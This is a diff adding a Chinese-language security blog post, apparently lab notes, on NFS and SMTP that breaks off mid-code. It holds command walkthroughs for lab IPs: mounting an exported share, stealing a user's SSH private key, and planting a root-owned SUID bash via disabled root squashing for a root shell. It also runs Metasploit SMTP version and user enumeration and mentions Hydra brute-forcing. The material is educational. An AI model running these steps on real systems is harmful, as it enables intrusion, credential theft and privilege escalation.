@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="网络文件系统（NFS）什么是 NFS？网络文件系统（Network File System，NFS）允许系统通过网络与其他系统共享目录和文件。借助 NFS，用户和程序可以像访问本地文件一样访问远程系统上的文件。通过将服务器上的整个或部分文件系统挂载到客户端系统上来实现。被挂载的文件系统部分可以由客户端访问，并按照分配给每个文件的权限进行访问。 NFS 如何工作？客户端请求将远程主机上的某个目录挂载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络服务 2">
+<meta property="og:url" content="https://cyphersun.github.io/2024/11/02/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD6/index.html">
+<meta property="og:site_name" content="CypherSun">
+<meta property="og:description" content="网络文件系统（NFS）什么是 NFS？网络文件系统（Network File System，NFS）允许系统通过网络与其他系统共享目录和文件。借助 NFS，用户和程序可以像访问本地文件一样访问远程系统上的文件。通过将服务器上的整个或部分文件系统挂载到客户端系统上来实现。被挂载的文件系统部分可以由客户端访问，并按照分配给每个文件的权限进行访问。 NFS 如何工作？客户端请求将远程主机上的某个目录挂载">
+<meta property="og:locale">
+<meta property="article:published_time" content="2024-11-02T20:38:40.000Z">
+<meta property="article:modified_time" content="2024-11-05T10:21:18.247Z">
+<meta property="article:author" content="CypherSun">
+<meta name="twitter:card" content="summary">
+
+
+<title >网络服务 2</title>
+
+<!-- Favicon -->
+
+
+    <link href='/favicon.ico?v=2.2.3' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="https://unpkg.com/hexo-theme-async@2.2.3/source/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"cyphersun.github.io","author":"CypherSun","root":"/","typed_text":["a cybersecurity engineer"],"theme_version":"2.2.3","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","apple_touch_icon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","show_text":"(/≧▽≦/)咦！又好了！","hide_text":"(●—●)喔哟，崩溃啦！","appleTouchIcon":null,"showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy","user_tag":"fas fa-user-alt"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-11-05 11:21:18"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.3" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+ 
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/tags/" target="">
+                    标签
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/about/" target="">
+                    关于
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/null">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            网络服务 2
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2024
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="https://avatars.githubusercontent.com/u/80212458?v=4">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        CypherSun
+    </h5>
+    
+        <div class="trm-label">
+            I`m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/CypherSun" title="Github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="/wechat.jpg" title="Wechat" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-weixin"></i>
+        </a>
+    
+        <a href="/qq.jpg" title="QQ" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-qq"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                地址:
+            </div>
+            <div class="trm-label trm-label-light">
+                银河系
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                年龄:
+            </div>
+            <div class="trm-label trm-label-light">
+                不清楚
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                实力:
+            </div>
+            <div class="trm-label trm-label-light">
+                上升期
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:84860748@qq.com" class="trm-btn">
+            联系我
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            11/02
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            21:38
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            CypherSun
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h2 id="网络文件系统（NFS）"><a href="#网络文件系统（NFS）" class="headerlink" title="网络文件系统（NFS）"></a>网络文件系统（NFS）</h2><h3 id="什么是-NFS？"><a href="#什么是-NFS？" class="headerlink" title="什么是 NFS？"></a>什么是 NFS？</h3><p>网络文件系统（Network File System，NFS）允许系统通过网络与其他系统共享目录和文件。借助 NFS，用户和程序可以像访问本地文件一样访问远程系统上的文件。通过将服务器上的整个或部分文件系统挂载到客户端系统上来实现。被挂载的文件系统部分可以由客户端访问，并按照分配给每个文件的权限进行访问。</p>
+<h3 id="NFS-如何工作？"><a href="#NFS-如何工作？" class="headerlink" title="NFS 如何工作？"></a>NFS 如何工作？</h3><p>客户端请求将远程主机上的某个目录挂载到本地目录，就像挂载物理设备一样。挂载服务将通过 RPC 连接到相关的挂载守护进程。</p>
+<p>服务器会检查用户是否有权限挂载请求的目录。服务器会返回一个文件句柄，用于唯一标识服务器上的每个文件和目录</p>
+<p>如果有人希望通过 NFS 访问文件，会向服务器上的 NFS 守护进程（NFSD）发出一个 RPC 调用。该调用包含以下参数：</p>
+<p>文件句柄<br>要访问的文件名<br>用户的用户 ID<br>用户的组 ID</p>
+<p>这些参数用于确定对指定文件的访问权限，从而控制用户的读写权限。</p>
+<h3 id="NFS-运行在什么系统上？"><a href="#NFS-运行在什么系统上？" class="headerlink" title="NFS 运行在什么系统上？"></a>NFS 运行在什么系统上？</h3><p>使用 NFS 协议可在运行 Windows 及其他非 Windows 操作系统的计算机之间传输文件。</p>
+<p>运行 Windows Server 的计算机可以作为其他非 Windows 客户端计算机的 NFS 文件服务器。NFS 也允许基于 Windows 的计算机访问存储在非 Windows NFS 服务器上的文件。<br><br></p>
+<h2 id="枚举-NFS"><a href="#枚举-NFS" class="headerlink" title="枚举 NFS"></a>枚举 NFS</h2><h3 id="什么是枚举？"><a href="#什么是枚举？" class="headerlink" title="什么是枚举？"></a>什么是枚举？</h3><p>枚举建立与目标主机的主动连接，以发现系统中潜在的攻击向量的过程，同时进一步对系统利用。指导攻击的信息将来自此阶段。</p>
+<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>为了对 NFS 服务器和共享进行更高级的枚举需要 nfs-common，这是用于在本地计算机上与NFS共享进行交互的工具包。</p>
+<h3 id="NFS-Common"><a href="#NFS-Common" class="headerlink" title="NFS-Common"></a>NFS-Common</h3><p>任何使用 NFS 的机器都需要安装此软件包。该软件包包含多个程序。主要关注 showmount 和 mount.nfs，从NFS共享中提取信息时，这两个工具最好用。安装 nfs-common，这个软件包在大多数Linux发行版中都默认提供</p>
+<p>可使用 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install nfs-common </span><br><span class="line"><span class="comment"># 安装 nfs-common</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>枚举的第一步是执行端口扫描，以尽可能多地了解目标机器的服务、开放端口和操作系统，可使用带有-A和-p-参数的nmap 深入扫描</p>
+<h3 id="挂载-NFS-共享"><a href="#挂载-NFS-共享" class="headerlink" title="挂载 NFS 共享"></a>挂载 NFS 共享</h3><p>客户端系统需要一个目录来访问主机服务器在导出文件夹中共享的内容。可以在系统的任何位置创建此目录。创建挂载点后，可使用 mount 命令将 NFS 共享连接到计算机上的挂载点</p>
+<br>
+
+
+
+
+
+<h2 id="NFS-利用"><a href="#NFS-利用" class="headerlink" title="NFS 利用"></a>NFS 利用</h2><p>如果在某台机器上获得低权限的 shell并可以 NFS 共享，可通过它提升权限，前提是 NFS 的配置允许</p>
+<h3 id="什么是root-squash？"><a href="#什么是root-squash？" class="headerlink" title="什么是root_squash？"></a>什么是root_squash？</h3><p>默认情况下，NFS 共享启用了 Root Squashing 功能，阻止任何连接到 NFS 共享的用户获取 NFS 卷的 root 权限。远程 root 用户连接后会被赋予 nfsnobody 用户身份，这是权限最低的本地用户。但如果关闭该功能，就可以创建带 SUID 位的文件，这样远程用户就能以 root 身份访问系统</p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>带 SUID 位的文件以文件所有者&#x2F;组的权限运行。文件会以 root 的权限运行，获取具有权限的 shell</p>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>将文件上传到 NFS 共享，并控制文件的权限。上传 bash shell 可执行文件。通过 SSH 登录，执行该文件以获得 root shell</p>
+<h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><p>使用在之前获取的密钥，直接从目标机器上获取 bash 可执行文件</p>
+<p>另一种方法是从 nmap 扫描中了解到服务器版本，并获取与服务器相同的标准的 bash 可执行文件</p>
+<h3 id="操作路径："><a href="#操作路径：" class="headerlink" title="操作路径："></a>操作路径：</h3><p>具体步骤以及获得 root shell 的过程：</p>
+<p>NFS 访问 -&gt; 获取低权限 shell -&gt; 将 bash 可执行文件上传到 NFS 共享 -&gt; 通 NFS 设置 SUID 权限，利用错误配置的 Root Squash -&gt; 通过 SSH 登录 -&gt; 执行带有 SUID 位的 bash 可执行文件 -&gt; 获得 ROOT 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/showmount -e 10.10.231.54</span><br><span class="line"><span class="comment"># /usr/sbin/showmount -e [目标 IP] </span></span><br><span class="line"><span class="comment"># 列出 NFS 共享，获得共享文件名/home</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/mount</span><br><span class="line"><span class="comment"># 创建一个目录用于挂载共享</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mount -t nfs 10.10.231.54:/home /tmp/mount -nolock</span><br><span class="line"><span class="comment"># sudo mount -t nfs [目标 IP]:[共享文件名] /tmp/mount/ -nolock</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /tmp/mount</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> cappucino</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line"><span class="comment"># 查看目录获得.ssh文件里面的id_rsa</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> id_rsa ~/id_rsa</span><br><span class="line"><span class="built_in">chmod</span> 600 ~/id_rsa</span><br><span class="line"><span class="comment"># 复制id_rsa到root目录进行修改权限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh -i ~/id_rsa cappucino@10.10.231.54</span><br><span class="line"><span class="comment"># ssh -i ~/id_rsa [目标用户名]@[目标 IP]</span></span><br><span class="line"><span class="comment"># 使用id_rsa文件进行连接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">scp -i ~/id_rsa cappucino@10.10.231.54:/bin/bash ~/Downloads/bash</span><br><span class="line"><span class="comment"># scp -i ~/id_rsa [目标用户名]@[目标 IP]:/bin/bash ~/Downloads/bash</span></span><br><span class="line"><span class="comment"># 另启窗口，将目标机器上的 bash 文件下载到本地</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> ~/Downloads/bash /tmp/mount/cappucino/</span><br><span class="line"><span class="comment"># 将下载的 bash 文件复制到挂载的 NFS 共享目 /tmp/mount/cappucino 目录中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chown</span> root /tmp/mount/cappucino/bash</span><br><span class="line"><span class="comment"># 将 bash 文件的所有者更改为 root</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +s /tmp/mount/cappucino/bash</span><br><span class="line"><span class="comment"># 设置 SUID 位权限，使该文件可以以 root 身份运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line"><span class="comment"># 回到cappucino 用户，进入 bash 文件所在的目录，确认bash在这</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./bash -p</span><br><span class="line"><span class="comment"># 确认 bash 文件在该目录中，运行以下命令启动具有 root 权限的 bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 即可获得 root shell。成功后可进入 /root 目录并查看 root 标志文件内容 </span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+
+<h2 id="简单邮件传输协议（Simple-Mail-Transfer-Protocol，SMTP）"><a href="#简单邮件传输协议（Simple-Mail-Transfer-Protocol，SMTP）" class="headerlink" title="简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）"></a>简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）</h2><h3 id="什么是-SMTP？"><a href="#什么是-SMTP？" class="headerlink" title="什么是 SMTP？"></a>什么是 SMTP？</h3><p>SMTP 是简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）的缩写，用于处理电子邮件的发送。为了支持电子邮件服务，需要一对协议 SMTP 和 POP&#x2F;IMAP。它们共同作用，使用户能够发送外发邮件并接收入站邮件</p>
+<p>SMTP 服务器的三个基本功能如下：</p>
+<p>验证通过 SMTP 服务器发送邮件的用户身份<br>发送外发邮件<br>如果外发邮件无法送达，将邮件退回给发送者</p>
+<p>在配置第三方电子邮件客户端中的新邮箱时会遇到 SMTP；因为在设置新邮件客户端时，通常需配置 SMTP 服务器，以便能够发送外发邮件。</p>
+<h3 id="POP-和-IMAP"><a href="#POP-和-IMAP" class="headerlink" title="POP 和 IMAP"></a>POP 和 IMAP</h3><p>邮局协议（Post Office Protocol，POP）和互联网邮件访问协议（Internet Message Access Protocol，IMAP）都是负责在客户端和邮件服务器之间传输电子邮件的协议。</p>
+<p>两者的主要区别在于：<br>POP 采用更简单的方式，将邮件服务器中的收件箱下载到客户端<br>IMAP 则同步当前收件箱与服务器上的新邮件，下载任何新的邮件。</p>
+<p>如果通过 IMAP 在一台设备上对收件箱进行更改，另一台设备同步收件箱时这些更改也会保持。POP&#x2F;IMAP 服务器负责执行这个过程。</p>
+<h3 id="SMTP-是如何工作的？"><a href="#SMTP-是如何工作的？" class="headerlink" title="SMTP 是如何工作的？"></a>SMTP 是如何工作的？</h3><p>电子邮件的传递过程类似于物理邮件的投递。用户提供电子邮件，通过服务将其送达收件人的收件箱。SMTP 服务器的角色类似于邮政分拣中心：邮件被发送到此服务器，然后由它转发至收件人</p>
+<p>电子邮件从用户计算机到达收件人的过程如下：</p>
+<p>1.邮件用户代理连接到用户域的 SMTP 服务器，启动 SMTP 握手。此连接通过 SMTP 通常为端口 25 进行。一旦连接建立并通过验证，SMTP 会话即开始</p>
+<p>2.开始发送邮件。客户端首先将发送方和收件人的电子邮件地址、邮件正文以及任何附件提交给服务器。</p>
+<p>3.SMTP 服务器会检查收件人和发送方的域名是否相同</p>
+<p>4.发送方的 SMTP 服务器会与收件方的 SMTP 服务器建立连接，将邮件中继传输过去。如果收件方的服务器无法访问或不可用，邮件会进入 SMTP 队列</p>
+<p>5.收件方的 SMTP 服务器会验证收到的邮件，通过检查域名和用户名是否识别成功来完成验证。服务器验证后，会将邮件转发至 POP 或 IMAP 服务器</p>
+<p>6。电子邮件会显示在收件人的收件箱中</p>
+<h3 id="SMTP-运行在什么系统上？"><a href="#SMTP-运行在什么系统上？" class="headerlink" title="SMTP 运行在什么系统上？"></a>SMTP 运行在什么系统上？</h3><p>Windows 服务器平台上可以轻松获得 SMTP 服务器软件， SMTP 的其他版本也可在 Linux 上运行</p>
+<br>
+
+
+
+
+
+<h2 id="SMTP枚举"><a href="#SMTP枚举" class="headerlink" title="SMTP枚举"></a>SMTP枚举</h2><h3 id="枚举服务器"><a href="#枚举服务器" class="headerlink" title="枚举服务器"></a>枚举服务器</h3><p>配置不当或存在漏洞的邮件服务器会成为攻击网络的切入点。在发起攻击之前，需要对服务器进行指纹识别，以确保精准定位目标。使用 MetaSploit 中的 smtp_version 模块来完成。该模块会扫描一系列 IP 地址，并识别所遇邮件服务器的版本信息。</p>
+<h3 id="从-SMTP-枚举用户"><a href="#从-SMTP-枚举用户" class="headerlink" title="从 SMTP 枚举用户"></a>从 SMTP 枚举用户</h3><p>SMTP 服务提供了两个用于枚举用户的内部命令：VRFY验证有效用户的名称和 EXPN显示用户别名及邮件列表的实际地址。通过这些 SMTP 命令，可生成一份有效用户列表</p>
+<p>Metasploit 名为 smtp_enum 的模块能够完成，使用该模块只需提供一个主机或主机范围，以及包含用户名的字典文件，即可进行用户枚举。</p>
+<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>使用 Metasploit 发起攻击前，先更新以确保使用最新版本</p>
+<h3 id="替代方法"><a href="#替代方法" class="headerlink" title="替代方法"></a>替代方法</h3><p>这种适用于大多数 SMTP 配置，还有其他非 Metasploit 工具，以针对其他存在漏洞的 SMTP 守护进程<br><br></p>
+<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><h3 id="目前掌握了哪些信息？"><a href="#目前掌握了哪些信息？" class="headerlink" title="目前掌握了哪些信息？"></a>目前掌握了哪些信息？</h3><p>在枚举阶段收集到的重要信息：</p>
+<p>一个用户帐户名称<br>SMTP 服务器的类型和操作系统</p>
+<p>通过端口扫描，发现该机器上唯一开放的其他端口是 SSH 登录端口。利用这些信息使用 Hydra 工具对该用户的 SSH 登录密码进行暴力破解</p>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>继续进行渗透操作，保留枚举阶段收集的信息记录，有助于后续的攻击</p>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>Hydra 提供了丰富的自定义选项，适用于对 SSH 等多种服务的密码攻击。Parrot 和 Kali 系统中默认包含 Hydra。Hydra 主要使用字典攻击</p>
+<p>使用的破解命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msfupdate</span><br><span class="line"><span class="comment"># 更新 Metasploit</span></span><br><span class="line"></span><br><span class="line">search smtp_version</span><br><span class="line"><span class="comment"># 搜索 smtp_version</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/smtp/smtp_version</span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 使用 smtp_version，展示出选项</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.116.38</span><br><span class="line"><span class="comment"># set RHOSTS [目标 IP]</span></span><br><span class="line"><span class="comment"># 设置目标IP</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line">back</span><br><span class="line"><span class="comment"># 使用 smtp_version 获得对方邮件传输代理 (MTA)和系统上，并退回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search smtp_enum</span><br><span class="line"><span class="comment"># 搜索 smtp_enum</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/smtp/smtp_enum</span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 使用 smtp_enum，展示出选项</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 